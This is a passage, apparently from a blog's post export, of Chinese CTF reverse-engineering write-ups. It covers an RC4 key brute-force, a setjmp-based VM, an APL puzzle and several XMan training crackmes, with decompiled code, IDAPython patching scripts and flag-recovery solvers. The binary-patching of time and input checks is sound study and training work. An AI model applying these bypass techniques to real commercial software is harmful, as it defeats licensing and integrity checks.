&#125;&#125;int main()&#123; BYTE table[256] = &#123; 0x58, 0x71, 0x8F, 0x32, 0x05, 0x06, 0x51, 0xC7, 0xA7, 0xF8, 0x3A, 0xE1, 0x06, 0x48, 0x82, 0x09, 0xA1, 0x12, 0x9F, 0x7C, 0xB8, 0x2A, 0x6F, 0x95, 0xFD, 0xD0, 0x67, 0xC8, 0xE3, 0xCE, 0xAB, 0x12, 0x1F, 0x98, 0x6B, 0x14, 0xEA, 0x89, 0x90, 0x21, 0x2D, 0xFD, 0x9A, 0xBB, 0x47, 0xCC, 0xEA, 0x9C, 0xD7, 0x50, 0x27, 0xAF, 0xB9, 0x77, 0xDF, 0xC5, 0xE9, 0xE1, 0x50, 0xD3, 0x38, 0x89, 0xEF, 0x2D, 0x72, 0xC2, 0xDF, 0xF3, 0x7D, 0x7D, 0x65, 0x95, 0xED, 0x13, 0x00, 0x1C, 0xA3, 0x3C, 0xE3, 0x57, 0xE3, 0xF7, 0xF7, 0x2C, 0x73, 0x88, 0x34, 0xB1, 0x62, 0xD3, 0x37, 0x19, 0x26, 0xBE, 0xB2, 0x33, 0x20, 0x3F, 0x60, 0x39, 0x87, 0xA6, 0x65, 0xAD, 0x73, 0x1A, 0x6D, 0x49, 0x33, 0x49, 0xC0, 0x56, 0x00, 0xBE, 0x0A, 0xCF, 0x28, 0x7E, 0x8E, 0x69, 0x87, 0xE1, 0x05, 0x88, 0xDA, 0x54, 0x3E, 0x3C, 0x0E, 0xA9, 0xFA, 0xD7, 0x7F, 0x4E, 0x44, 0xC6, 0x9A, 0x0A, 0xD2, 0x98, 0x6A, 0xA4, 0x19, 0x6D, 0x8C, 0xE1, 0xF9, 0x30, 0xE5, 0xFF, 0x33, 0x4A, 0xA9, 0x52, 0x3A, 0x0D, 0x67, 0x20, 0x1D, 0xBF, 0x36, 0x3E, 0xE8, 0x56, 0xBF, 0x5A, 0x88, 0xA8, 0x69, 0xD6, 0xAB, 0x52, 0xF1, 0x14, 0xF2, 0xD7, 0xEF, 0x92, 0xF7, 0xA0, 0x70, 0xA1, 0xEF, 0xE3, 0x1F, 0x66, 0x2B, 0x97, 0xF6, 0x2B, 0x30, 0x0F, 0xB0, 0xB4, 0xC0, 0xFE, 0xA6, 0x62, 0xFD, 0xE6, 0x4C, 0x39, 0xCF, 0x20, 0xB3, 0x10, 0x60, 0x9F, 0x34, 0xBE, 0xB2, 0x1C, 0x3B, 0x6B, 0x1D, 0xDF, 0x53, 0x72, 0xF2, 0xFA, 0xB1, 0x51, 0x82, 0x04, 0x30, 0x56, 0x1F, 0x37, 0x72, 0x7A, 0x97, 0x50, 0x29, 0x86, 0x4A, 0x09, 0x3C, 0x59, 0xC4, 0x41, 0x71, 0xF8, 0x1A, 0xD2, 0x30, 0x88, 0x63, 0xFF, 0x85, 0xDE, 0x24, 0x8C, 0xC3, 0x37, 0x14, 0xC7 &#125;; int max_t = 0x5B028A8F, min_t = 0x5AFFE78F + 1; DWORD dst[768]; BYTE buf[256]; for(int t = min_t; t &lt;= max_t; ++t) &#123; srand(t); for(int i = 0; i &lt;= 255; ++i) buf[i] = table[i] ^ rand(); memset(dst, 0, 0xC00); for(int i = 0; i &lt;= 255; ++i) &#123; dst[3 * i] = buf[i]; dst[3 + i + 1] = 0x7FFFFFFF; dst[3 + i + 2] = 0; cal_n(dst, i); &#125; DWORD checksum = dst[766]; DWORD decryptkey = dst[767]; if(checksum == 0x700) &#123; printf(\"Found!\\n\"); printf(\"Time=%d, Deryptkey=%d\\n\", t, decryptkey); // time = 0x5b00e398 decryptkey = 0x322ce7a4 break; &#125; &#125; printf(\"Done!\\n\"); return 0;&#125; 使用keypatch插件修改汇编代码，来绕过时间验证： 绕过时间的check后继续执行，找到如下函数： 12345678910111213141516171819202122232425262728293031323334__int64 __fastcall sub_4023B1(const char *a1, __int64 a2, __int64 a3, __int64 a4)&#123; __int64 v4; // r9 __int64 v5; // r9 __int64 v6; // r9 __int64 v8; // [rsp+20h] [rbp-30h] __int64 v9; // [rsp+28h] [rbp-28h] __int64 v10; // [rsp+30h] [rbp-20h] __int64 v11; // [rsp+38h] [rbp-18h] int v12; // [rsp+43h] [rbp-Dh] char v13; // [rsp+47h] [rbp-9h] __int64 *v14; // [rsp+48h] [rbp-8h] if ( !Time_data[0] ) exit(0); v13 = 0; v12 = Time_data[0]; puts_enc((const char *)&amp;unk_4052A0, 49i64, Time_data[0], a4); v8 = 0i64; v9 = 0i64; v10 = 0i64; v11 = 0i64; LODWORD(v8) = 538976288; v14 = (__int64 *)((char *)&amp;v8 + 4); scanf(\"%26s\", (char *)&amp;v8 + 4, 538976288i64, 0i64, 0i64, 0i64); rc4_enc((__int64)v14, 26i64, (__int64)&amp;v12, 4i64); if ( !(unsigned int)vm_start((size_t)v14) ) return puts_enc((const char *)&amp;unk_4052D1, 6i64, Time_data[0], v4); rc4_enc((__int64)v14, 26i64, (__int64)&amp;v12, 4i64); sub_401FFB(); puts_enc((const char *)&amp;unk_4052E0, 35i64, Time_data[0], v5); puts((const char *)&amp;v8); return puts_enc((const char *)&amp;unk_4052E0, 35i64, Time_data[0], v6);&#125; 这里有一个明显的rc4加密过程，具体不多说了。Key-scheduling algorithm (KSA，Key调度算法)： 123456789101112131415161718192021222324252627282930__int64 __fastcall rc4_ksa(__int64 a1, __int64 a2, __int64 a3, char *sbox, unsigned int a5)&#123; __int64 result; // rax unsigned int v6; // eax char v7[263]; // [rsp+0h] [rbp-80h] unsigned __int8 v8; // [rsp+107h] [rbp+87h] unsigned int v9; // [rsp+108h] [rbp+88h] int i; // [rsp+10Ch] [rbp+8Ch] v9 = 0; result = 0LL; memset(v7, 0, 0x100uLL); v8 = 0; for ( i = 0; i &lt;= 255; ++i ) &#123; sbox[i] = i; result = i; v7[i] = *(_BYTE *)(i % a5 + a3); &#125; for ( i = 0; i &lt;= 255; ++i ) &#123; v6 = (unsigned int)((signed int)((unsigned __int8)v7[i] + v9 + (unsigned __int8)sbox[i]) &gt;&gt; 31) &gt;&gt; 24; v9 = (unsigned __int8)(v6 + v7[i] + v9 + sbox[i]) - v6; v8 = sbox[i]; sbox[i] = sbox[v9]; result = v8; sbox[v9] = v8; &#125; return result;&#125; Pseudo-random generation algorithm (PRGA，伪随机数生成算法)： 123456789101112131415161718192021222324252627__int64 __fastcall rc4_prga(__int64 a1, __int64 a2, char *input, char *sbox, unsigned int a5)&#123; unsigned int v5; // eax char v6; // ST0F_1 __int64 result; // rax unsigned int i; // [rsp+14h] [rbp-Ch] int v9; // [rsp+18h] [rbp-8h] unsigned int v10; // [rsp+1Ch] [rbp-4h] v10 = 0; v9 = 0; for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= a5 ) break; v10 = (unsigned __int8)(((unsigned int)((signed int)(v10 + 1) &gt;&gt; 31) &gt;&gt; 24) + v10 + 1) - ((unsigned int)((signed int)(v10 + 1) &gt;&gt; 31) &gt;&gt; 24); v5 = (unsigned int)((v9 + (unsigned __int8)sbox[v10]) &gt;&gt; 31) &gt;&gt; 24; v9 = (unsigned __int8)(v5 + v9 + sbox[v10]) - v5; v6 = sbox[v10]; sbox[v10] = sbox[v9]; sbox[v9] = v6; input[i] ^= sbox[(unsigned __int8)(sbox[v10] + sbox[v9])]; &#125; return result;&#125; 然后接下来对虚拟机指令结构进行分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121__int64 __fastcall vm_start(size_t sign, char *sig_func, __int64 a3, size_t a4)&#123; int cur_code; // eax __int64 v5; // rdx int v6; // ST12C_4 unsigned int v8; // [rsp+124h] [rbp-Ch] signed int loop; // [rsp+128h] [rbp-8h] int index; // [rsp+12Ch] [rbp-4h] strncpy((char *)sign, sig_func, a4); signal(sign, (void (__cdecl *)(int))sig_func); index = 0; loop = 1; v8 = 0; secret_str = (unsigned __int64)&amp;secret; rc4ed_input_str = (unsigned __int64)&amp;rc4ed_input; while ( loop ) &#123; cur_code = setjmp((_JBTYPE *)sign); // jmp to longjmp if ( cur_code == 168 ) // 0xA8 &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] -= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &gt; 168 ) &#123; if ( cur_code == 172 ) // 0xAC &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] &amp;= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &gt; 172 ) &#123; if ( cur_code == 174 ) // 0xAE &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] ^= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &lt; 174 ) // 0xAD &#123; enc[(unsigned __int8)vm_code[index]] = (unsigned __int8)~LOBYTE(enc[(unsigned __int8)vm_code[index]]); ++index; &#125; else &#123; if ( cur_code != 175 ) // 0xAF goto LABEL_43; dword_409060 = (unsigned __int8)vm_code[index] &gt;&gt; 4; dword_409064 = vm_code[index] &amp; 0xF; if ( !setjmp((_JBTYPE *)sign) ) vm_code[index] = dword_409060 / (unsigned __int8)vm_code[index + 1];// divide 0 will occour exception index += 2; &#125; &#125; else if ( cur_code == 170 ) // 0xAA &#123; enc[(unsigned __int8)vm_code[index]] = enc[(unsigned __int8)vm_code[index + 1]]; index += 2; &#125; else if ( cur_code &gt; 170 ) // 0xAB &#123; enc[(unsigned __int8)vm_code[index]] = (unsigned __int8)vm_code[index + 1]; index += 2; &#125; else // 0xA9 &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] += enc[vm_code[index] &amp; 0xF]; ++index; &#125; &#125; else if ( cur_code == 163 ) // 0xA3 &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] |= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &gt; 163 ) &#123; if ( cur_code == 166 ) // 0xA6 &#123; if ( !dword_409054 ) index += vm_code[index]; ++index; &#125; else if ( cur_code &gt; 166 ) // 0xA7 &#123; if ( dword_409054 ) index += vm_code[index]; ++index; &#125; else &#123; if ( cur_code != 165 ) goto LABEL_43; index += (unsigned __int8)vm_code[index] + 1; &#125; &#125; else if ( cur_code == 160 ) // 0xA0 &#123; enc[(unsigned __int8)vm_code[index]] = *(unsigned __int8 *)enc[(unsigned __int8)vm_code[index]]; ++index; &#125; else if ( cur_code == 162 ) // 0xA2 &#123; v6 = index + 1; enc[(unsigned __int8)vm_code[v6]] &gt;&gt;= enc[(unsigned __int8)vm_code[v6]]; index = v6 + 1; &#125; else // 0xCC &#123; if ( !cur_code ) &#123; v5 = (unsigned __int8)vm_code[index]; call_longjmp((_JBTYPE *)sign, (int)sig_func); &#125;LABEL_43: loop = 0; v8 = dword_409054; &#125; &#125; return v8;&#125; 动态调试的时候直接把vmcode中的数据dump出来，通过对分支语句的判断，得出如下结论： 123456789101112131415161718192021222324252627vmcode = [0xAB, 0x03, 0x00, 0xAB, 0x04, 0x1A, 0xAB, 0x00, 0x66, 0xAA, 0x05, 0x02, 0xA9, 0x53, 0xA0, 0x05, 0xAB, 0x06, 0xCC, 0xA9, 0x56, 0xAB, 0x06, 0xFF, 0xAC, 0x56, 0xAE, 0x50, 0xAD, 0x00, 0xAA, 0x06, 0x05, 0xAA, 0x05, 0x01, 0xA9, 0x53, 0xA0, 0x05, 0xAF, 0x56, 0x00, 0xA7, 0x01, 0xCC, 0xA9, 0x35, 0xAA, 0x05, 0x03, 0xAF, 0x54, 0x00, 0xA6, 0xD1, 0xCC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]0xAB, 0x03, 0x00, // MOV enc[0x03], 0x000xAB, 0x04, 0x1A, // MOV enc[0x04], 0x1A0xAB, 0x00, 0x66, // MOV enc[0x00], 0x020xAA, 0x05, 0x02, // MOV enc[0x05], enc[0x02]0xA9, 0x53, // ADD enc[0x53 &gt;&gt; 4], enc[0x53 &amp; 0xF]0xA0, 0x05, // MOV enc[0x05], enc[0x05][0]0xAB, 0x06, 0xCC, // MOV enc[0x06], 0xCC0xA9, 0x56, // ADD enc[0x56 &gt;&gt; 4], enc[0x56 &amp; 0xF]0xAB, 0x06, 0xFF, // MOV enc[0x06], 0xFF0xAC, 0x56, // AND enc[0x56 &gt;&gt; 4], enc[0x56 &amp; 0xF]0xAE, 0x50, // XOR enc[0x50 &gt;&gt; 4], enc[0x50 &amp; 0xF]0xAD, 0x00, // MOV enc[0x00], ~LOBYTE(enc[0x00])0xAA, 0x06, 0x05, // MOV enc[0x06], enc[0x05]0xAA, 0x05, 0x01, // MOV enc[0x05], enc[0x01]0xA9, 0x53, // AND enc[0x53 &gt;&gt; 4], enc[0x53 &amp; 0xF]0xA0, 0x05, // MOV enc[0x05], enc[0x05][0]0xAF, 0x56, 0x00, // SUB 0x56 &gt;&gt; 4, 0(JMP to longjmp) ==&gt; MOV enc[0x56], longjmp()0xA7, 0x01, // if(sign) ==&gt; ADD $EIP, 0x010xCC, // JMP0xA9, 0x35, // AND enc[0x35 &gt;&gt; 4], enc[0x35 &amp; 0xF]0xAA, 0x05, 0x03, // MOV enc[0x05], enc[0x03]0xAF, 0x54, 0x00, // SUB 0x54 &gt;&gt; 4, 0(JMP to longjmp) ==&gt; MOV enc[0x54], longjmp()0xA6, 0xD1, // if(!sign) ==&gt; ADD $EIP, 0xD10xCC, // JMP0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 相应的汇编伪代码： 1234567891011121314151617181920212223242526272829r1 = secretr2 = rc4ed_inputMOV r3, 0x00MOV r4, 0x1AMOV r0, 0x66s1: MOV r5, r2 ADD r5, r3 MOV r5, byte r5 ; rc4ed_input[i] MOV r6, 0xCC ADD r5, r6 ; rc4ed_input[i] += 0xCC MOV r6, 0xFF AND r5, r6 ; rc4ed_input[i] &amp;= 0xFF XOR r5, r0 ; rc4ed_input[i] ^= r0 NOT r0/m8 ; r0 = ~r0 MOVZX r0, r0/m8 MOV r6, r5 MOV r5, r1 ADD r5, r3 MOV r5, byte r5 CMP r5, r6 JZ s2 STOPs2: ADD r3, r5 MOV r5, r3 TEST r5, r3 JNZ s2 STOP 伪代码: 1234567r0 = 0x66for i in range(0x26): x = ((rc4ed_input[i] + 0xCC) &amp; 0xFF) ^ r0 r0 = ~ r0 y = secret[x] if(x != y) break 根据逻辑可以求出被rc4加密过后的字符串，secret数组的值可以在ida python中dump出来： 12345678910111213141516for addr in range(0x405320, 0x405340): print hex(idc.Byte(addr)) + ','r0 = 0x66secret = [0x89, 0xC1, 0xEC, 0x50, 0x97, 0x3A, 0x57, 0x59, 0xE4, 0xE6, 0xE4, 0x42, 0xCB, 0xD9, 0x08, 0x22, 0xAE, 0x9D, 0x7C, 0x07, 0x80, 0x8F, 0x1B, 0x45, 0x04, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]rc4ed_str = ''rc4ed_list = []for i in range(0x1A): for ch in range(0xFF + 1): t = ((ch + 0xCC) &amp; 0xFF) ^ r0 if(t == secret[i]): # rc4ed_str += chr(ch) rc4ed_list.append(hex(ch)) r0 = (~ r0) &amp; 0xFF# print rc4ed_strprint rc4ed_list 又因为rc4是对称加密，所以可以直接在输入部分下断点，修改自己的input，可以在x64_dbg中修改： ida中可以通过ida python跑下面的脚本修改： 123456rc4ed_list = [0x23, 0x8c, 0xbe, 0xfd, 0x25, 0xd7, 0x65, 0xf4, 0xb6, 0xb3, 0xb6, 0xf, 0xe1, 0x74, 0xa2, 0xef, 0xfc, 0x38, 0x4e, 0xd2, 0x1a, 0x4a, 0xb1, 0x10, 0x96, 0xa5]reg = 0x22FBD4i = 0for addr in range(reg, reg + 0x1A): idc.PatchByte(addr, rc4ed_list[i]) i = i + 1 最后可以在内存里看到一部分flag，重新运行程序输入后摘掉眼镜可以看到完整的flag。 Irregular RE(PCTF-apl)各种各样的格式文件： 1lua/python/java/lua-jit/hashell/applescript/js/solidity/webassembly/etc… 12firmware/raw bin/risc-v/etc…chip8/avr/clemency/etc… 一般情况下，需要找到文件格式对应的识别器、反汇编器、反编译器等后，再进行正式逆向。 下面分析一下PCTF中的apl这题。关于apl的网站，可以在网站上了解和尝试apl的语法。 analysis函数可以分解成这样： 123⎕IO←0⋄&apos;BIE°?½&gt;IL½E.!!&lt;E!:E84¥¸²E23Å8»968&apos;&#123; &#123;⍵(~⍵)/&apos;success&apos; &apos;fail&apos;&#125;⊃(+/⍺=⎕UCS 13+&#123;+/⍵/⌽2*⍳⍴⍵&#125;¨,/33 8⍴(8×⍴⍵)⍴7⌽⍉(-⌊(⍴&apos;f0xtr0t&apos;)÷2)⌽⍉11 24⍴∊&#123;a≠8↑(0,a←(8⍴2)⊤⍵)&#125;¨⌽⎕UCS ⍵)=⍴⍺&#125;&apos;INPUT HERE&apos; 被加密的的字符串即enc = &#39;BIE°?½&gt;IL½E.!!&lt;E!:E84¥¸²E23Å8»968&#39;。那么需要解决的就是以下的加密过程： 1&#123;⎕UCS 13+&#123;+/⍵/⌽2*⍳⍴⍵&#125;¨,/33 8⍴(8×⍴⍵)⍴7⌽⍉(-⌊(⍴&apos;f0xtr0t&apos;)÷2)⌽⍉11 24⍴∊&#123;a≠8↑(0,a←(8⍴2)⊤⍵)&#125;¨⌽⎕UCS ⍵&#125; 下面做一些分解： func1: {⍵(~⍵)/&#39;success&#39; &#39;fail&#39;} // judge func2: {+/⍵/⌽2*⍳⍴⍵} // bin_arr mul 2 func3: {a≠8↑(0,a←(8⍴2)⊤⍵)} 127 ==&gt; 0 1 1 1 1 1 1 1 // f(x) = x ^ (x &gt;&gt; 1) // 2⊥0 1 1 1 1 1 1 1 ==&gt; 127 part1: &#39;abc&#39;{ {⍵(~⍵)/&#39;success&#39; &#39;fail&#39;}⊃(+/⍺=⍵)=⍴⍺}&#39;abc&#39; ==&gt; &#39;success&#39; part2: ⎕UCS // turn to ascii part3: (-⌊(⍴&#39;f0xtr0t&#39;)÷2) ==&gt; -3 // -(len(&#39;f0xtr0t&#39;) / 2) part4: 11 24⍴∊{part3} &amp; 33 8⍴ // turn into a axb matrix part5: ⌽⍉ // matrix transposition 加密的步骤： Convert to decimal Reverse the array Convert each value to an array of 8 bits and apply f(x) = x ^ (x &gt;&gt; 1) Reshape into 11x24 Transpose and retate by -3 Transpose and retate by 7 Reshape into 33x8 Convert to decimal and add 13 Convert to ascii reverse解密函数： 1&#123;⌽⎕UCS(&#123;2⊥a≠8↑(0,a←(8⍴2)⊤⍵)&#125; ⍣ 7)¨ 2⊥¨,/33 8⍴(8×⍴⍵)⍴⍉3⌽⍉¯7⌽11 24⍴∊&#123;(8⍴2)⊤⍵&#125;¨ ¯13+⎕UCS ⍵&#125; &apos;BIE°?½&gt;IL½E.!!&lt;E!:E84¥¸²E23Å8»968&apos; 分解部分： func1: {2⊥a≠8↑(0,a←(8⍴2)⊤⍵)} // reverse f(x) = x ^ (x &gt;&gt; 1) &lt;== fun1 ^ (N - 1) = func1 ^ (-1) [x] func2: {(8⍴2)⊤⍵} // decimal to bits [x] part1: ⌽ // reverse part2: {}⍣7 // for 7 times 逆向的过程： Convert to decimal Substract 13 Convert into an array of 8 bits Reshape into 11x24 Reverse the transpose-and-reverse process Reshape into 33x8 Convert to decimal Reverse the kind-of-xor process Convert to ascii Reverse the string","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"XMan RE（一）","slug":"XMan-RE（一）","date":"2018-08-02T06:24:12.000Z","updated":"2018-10-07T09:43:57.696Z","comments":true,"path":"2018/08/02/XMan-RE（一）/","link":"","permalink":"https://qianfei11.github.io/2018/08/02/XMan-RE（一）/","excerpt":"XMan正式学习的第一天，冠成大佬带我们入门逆向。","text":"XMan正式学习的第一天，冠成大佬带我们入门逆向。 国际比赛: DEFCON CTF, C3CTF, HITCON CTF, TCTF, BKP CTF, Plaid CTF, WCTF, RECTF国内比赛: XCTF, HCTF, LCTF, 强网杯 打CTF得到什么 安全基础能力 代码/文档的快速阅读 逆向工程 脆弱点的挖掘和利用 面向安全的开发 算法能力 沟通和社交 ToolsDisassembler IDA pro JEB ir BINARY NINJA Tracer API monitor Pin IPT (Intel Processor Trace) Debugger OD winDbg GDB kingstone capstone unicorn panda Decomplier Emulator Symbolic Execution angr Information gathering Pre file 看平台，架构，文件类型 string 看关键字符串，GitHub搜一搜 peid 查壳 binwalk 查隐藏信息 一些小知识 动态调试：Taint Analysis（污点分析）、reverse code block by block 常见加密编码算法：大数加减乘除，最短路径，动态规划等传统算法 常见数据结构：graph/tree/hash table/etc 常用设计模式：proxy stub etc 混淆（Obfuscation）常见方式：oolvm、control flow flatten、movfuscator、push rax,ret、vm/self modify code re0_0拖进ida，找到main函数。judge函数不能反编译，需要先通过脚本解密。 123456judge = 0x600B00for i in range(182): addr = 0x600B00 + i byte = get_bytes(addr, 1) byte = ord(byte) ^ 0x0C patch_byte(addr, byte) 然后还是不能f5，修改函数结束的地址。 然后可以看到函数的内容： 12345678910111213141516171819202122232425262728signed __int64 __fastcall judge(char *a1)&#123; char v2[14]; // [rsp+8h] [rbp-20h] int i; // [rsp+24h] [rbp-4h] v2[0] = 102; v2[1] = 109; v2[2] = 99; v2[3] = 100; v2[4] = 127; v2[5] = 107; v2[6] = 55; v2[7] = 100; v2[8] = 59; v2[9] = 86; v2[10] = 96; v2[11] = 59; v2[12] = 110; v2[13] = 112; for ( i = 0; i &lt;= 13; ++i ) a1[i] ^= i; for ( i = 0; i &lt;= 13; ++i ) &#123; if ( a1[i] != v2[i] ) return 0LL; &#125; return 1LL;&#125; 根据judge函数的逻辑写出解密脚本： 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; char enc[15], flag[15]; enc[0] = 102; enc[1] = 109; enc[2] = 99; enc[3] = 100; enc[4] = 127; enc[5] = 107; enc[6] = 55; enc[7] = 100; enc[8] = 59; enc[9] = 86; enc[10] = 96; enc[11] = 59; enc[12] = 110; enc[13] = 112; for(int i = 0; i &lt; strlen(enc); i++) flag[i] = enc[i] ^ i; printf(\"%s\", flag); return 0;&#125; re1_0在windows下测试一下软件，可以看到MessageBoxA句柄。在ida中找到该函数。通过交叉引用向上追溯函数，然后找到关键部分的汇编。 通过ida快捷键p创建函数。然后f5反编译，得到关键代码： 1234567891011121314151617181920212223int __thiscall sub_4015E0(CWnd *this)&#123; CWnd *v1; // esi int result; // eax char *v3; // [esp-4h] [ebp-Ch] char **v4; // [esp+4h] [ebp-4h] v1 = this; CWnd::UpdateData(this, 1); if ( *(_DWORD *)(*((_DWORD *)v1 + 165) - 8) == 33 &amp;&amp; (v3 = (char *)*((_DWORD *)v1 + 165), v4 = &amp;v3, CString::CString((CString *)&amp;v3, (CWnd *)((char *)v1 + 660)), sub_401630(v1, v3)) ) &#123; result = sub_4016E0(v1); &#125; else &#123; result = sub_401720(v1); &#125; return result;&#125; 这里可以看到对输入字符串进行了长度比较，还有加密后的比对。 1234567891011121314151617181920212223242526char __thiscall sub_401630(_BYTE *this, char *a2)&#123; int v2; // edi _BYTE *v3; // ebp int v4; // edx signed int v5; // esi char v7; // [esp+13h] [ebp-1h] v2 = 0; v3 = this; v7 = 1; v4 = 10; v5 = 0; do &#123; srand(v4); v4 = rand() % 10; if ( a2[v2] != v3[v5 + 96 + v4] ) v7 = 0; v5 += 10; ++v2; &#125; while ( v5 &lt; 330 ); CString::~CString((CString *)&amp;a2); return v7;&#125; 这里有一个if来判断输入字符串在加密后是否与目标串相等，通过直接修改汇编代码的方式来跳过判断。 然后通过动态调试查看每一次被mov到al中的字符，拼凑起来得到flag。 12345678910111213141516171819#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;random&gt;int main()&#123; int enc_num1[33] = &#123;0x66, 0x6C, 0x61, 0x67, 0x7B, 0x54, 0x68, 0x65, 0x2D, 0x59, 0x33, 0x6C, 0x6C, 0x30, 0x77, 0x2D, 0x74, 0x75, 0x72, 0x62, 0x34, 0x6E, 0x73, 0x2D, 0x55, 0x70, 0x172, 0x169, 0x124, 0x169, 0x16E, 0x167, 0x17D&#125;; char enc1[33]; for(int i = 0; i &lt; 33; i++) enc1[i] = char(enc_num1[i]); printf(\"%s\", enc1);// int count = 33, seed = 10;// while(count--)// &#123;// srand(seed);// seed = rand() % 10;// printf(\"%d\", seed);// &#125; return 0;&#125; re2_1拖进ida查看main函数： 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax HANDLE v4; // eax DWORD NumberOfBytesWritten; // [esp+4h] [ebp-24h] char Buffer; // [esp+8h] [ebp-20h] print_string((int)aPleaseInputFla); scanf(a31s, &amp;Buffer); if ( strlen(&amp;Buffer) == 19 ) &#123; sub_401220(); v4 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0); WriteFile(v4, &amp;Buffer, 0x13u, &amp;NumberOfBytesWritten, 0); sub_401240(&amp;Buffer, &amp;NumberOfBytesWritten); if ( NumberOfBytesWritten == 1 ) print_string((int)aRightFlagIsYou); else print_string((int)aWrong); system(aPause); result = 0; &#125; else &#123; print_string((int)aWrong); system(aPause); result = 0; &#125; return result;&#125; main函数中有一个很像flag的地方，但是点进去后逻辑是错误的，并且会和一个假的flag比较。 很容易发现在比较假flag之前执行了一个sub_401220()函数，显然是藏flag的地方。再继续跟着逻辑走，可以找到flag_place()： 12345678910111213141516171819202122232425262728293031323334353637383940signed int __cdecl flag_place(char *buf, signed int n)&#123; int i; // eax char t; // bl char v4; // cl int v5; // eax LOBYTE(i) = 0; if ( n &gt; 0 ) &#123; do &#123; if ( (_BYTE)i == 18 ) &#123; buf[18] ^= 0x13u; &#125; else &#123; if ( (char)i % 2 ) t = buf[(char)i] - i; else t = buf[(char)i + 2]; buf[(char)i] = i ^ t; &#125; LOBYTE(i) = i + 1; &#125; while ( (char)i &lt; n ); &#125; v4 = 0; if ( n &lt;= 0 ) return 1; v5 = 0; while ( byte_40A030[v5] == buf[v5] ) &#123; v5 = ++v4; if ( v4 &gt;= n ) return 1; &#125; return 0;&#125; 根据逻辑写出解密脚本 1234567891011121314enc = [0x61, 0x6A, 0x79, 0x67, 0x6B, 0x46, 0x6D, 0x2E, 0x7F, 0x5F, 0x7E, 0x2D, 0x53, 0x56, 0x7B, 0x38, 0x6D, 0x4C, 0x6E]flag = [0] * 19for i in range(len(enc)): if i == 18: flag[i] = chr(enc[i] ^ 0x13) else: if i % 2 == 1: t = enc[i] ^ i flag[i] = chr(t + i) else: t = enc[i] ^ i flag[i + 2] = chr(t)for i in range(len(flag)): print(flag[i], end='') Evr_1拖进ida，发现堆栈不平衡，不能f5。patch之后反编译： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108__int64 main_0()&#123; int v0; // edx __int64 v1; // ST08_8 char v3; // [esp-14h] [ebp-130h] int v4; // [esp-10h] [ebp-12Ch] char *v5; // [esp-Ch] [ebp-128h] char *v6; // [esp-8h] [ebp-124h] signed int v7; // [esp-4h] [ebp-120h] char v8; // [esp+0h] [ebp-11Ch] bool v9; // [esp+Fh] [ebp-10Dh] char v10; // [esp+D7h] [ebp-45h] int i; // [esp+E0h] [ebp-3Ch] bool v12; // [esp+EFh] [ebp-2Dh] bool v13; // [esp+FBh] [ebp-21h] bool v14; // [esp+107h] [ebp-15h] HMODULE v15; // [esp+110h] [ebp-Ch] v15 = GetModuleHandleW(0); puts(\"Welcome to HCTF 2017\\n\\n\", v8); puts(\"Mark.09 is hijacking Shinji Ikari now...\\n\\n\", v8); puts(\"Check User: \\n\", v8); v7 = 256; v6 = Str; gets_str(\"%s\", Str, 256); if ( !check() ) &#123; show_fail_box(); exit(0); &#125; show_success_box(); puts(\"Check Start Code: \\n\", v7); v6 = (char *)128; v5 = input; gets_str(\"%s\", input, 128); while ( getchar() != 10 ) ; if ( check_len(input) != 35 ) &#123; fail_1(); fail_2(); exit(0); &#125; flag_trans_0((int)&amp;unk_41B570, (int)input); v4 = dword_41B780; useless((int)flag_trans_3, (int)sub_4111EA); if ( sub_411361(1) ) &#123; fail_1(); fail_2(); exit(0); &#125; v9 = useless((int)flag_trans_1, (int)sub_41139D) != 0; v14 = v9; flag_trans_1((int)byte_41B5F0, (int)&amp;unk_41B570); sub_411258(dword_41B770, dword_41B774, 204); if ( sub_411361(2) ) &#123; fail_1(); fail_2(); exit(0); &#125; v9 = useless((int)flag_trans_2, (int)sub_411046) != 0; v13 = v9; flag_trans_2((int)byte_41B670, (int)&amp;unk_41B570); sub_411258(dword_41B778, dword_41B77C, 205); if ( sub_411361(3) ) &#123; fail_1(); fail_2(); exit(0); &#125; v9 = useless((int)flag_trans_3, (int)sub_4111EA) != 0; v12 = v9; flag_trans_3((int)byte_41B6F0, (int)&amp;unk_41B570); sub_411258(dword_41B780, dword_41B784, 221); for ( i = 0; i &lt; 7; ++i ) &#123; byte_41B577[i] = byte_41B5F0[i]; byte_41B57E[i] = byte_41B670[i]; byte_41B585[i] = byte_41B6F0[i]; &#125; if ( flag_check(&amp;unk_41B570, &amp;enc_flag) ) &#123; MessageBoxA(0, \"&gt; DETONATION FUNCTION\\n READY\", \"WILLE\", 0); puts(\"[Y/N]?\\n\", v3); gets_str(\"%c\", &amp;v10, 1); if ( v10 != 89 &amp;&amp; v10 != 121 ) &#123; fail_1(); fail_2(); &#125; else &#123; sub_411082(); puts(\"Prevent IMPACT success\\n\", v3); &#125; &#125; else &#123; fail_1(); fail_2(); &#125; system(\"pause\"); HIDWORD(v1) = v0; LODWORD(v1) = 0; return 